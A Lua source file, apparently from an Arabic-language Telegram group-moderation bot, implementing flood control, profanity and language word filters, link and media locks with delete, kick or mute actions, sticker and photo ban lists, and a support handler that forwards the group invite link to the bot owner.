local Black_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Black_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⋄العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⋄["..Black_Msg.."] \n")
else
send(msg.chat_id_,0," ⋄العضو : {["..data.first_name_.."](T.ME/SOPOWERB0T)}\n⋄["..Black_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","سلام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager2(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ⋄عذرا »> {[@"..data.username_.."]}\n⋄عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ⋄عذرا »> {["..data.first_name_.."](T.ME/SOPOWERB0T)}\n⋄عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager2(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⋄عذرا »> {[@"..data.username_.."]}\n⋄عذرا تم منع الصوره \n" ) 
else
send(msg.chat_id_,0," ⋄عذرا »> {["..data.first_name_.."](T.ME/SOPOWERB0T)}\n⋄عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager2(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⋄عذرا »> {[@"..data.username_.."]}\n⋄عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," ⋄عذرا »> {["..data.first_name_.."](T.ME/SOPOWERB0T)}\n⋄عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text and text:match("^المطور$") or text and text:match("^مطور$") or text and text:match("^الدعم$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
if not SudoBot(msg) then
sendText(SUDO,"⋄هناك من بحاجه الى مساعده \n⋄الشخص  {"..Name.."}\n⋄اسم الجروب {"..NameChat.."}\n⋄ايدي الجروب {`"..msg.chat_id_.."`}\n⋄رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end
end,nil)
end,nil)
end

if text == 'تفعيل' and Mod(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
